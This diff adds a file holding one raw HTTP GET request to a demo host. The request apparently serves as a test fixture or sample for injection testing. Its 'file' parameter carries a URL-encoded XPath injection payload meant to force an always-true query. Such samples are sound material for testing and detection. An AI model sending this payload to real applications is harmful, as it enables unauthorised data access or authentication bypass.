@@ -1,0 +1,4 @@
+GET /a?file=%27%2Bor%2Bcount%28%2F%2A%29%3E0%2Bor%2B%27x%27%3D%27y HTTP/1.1
+Host: demo.example.com
+Connection: close
+
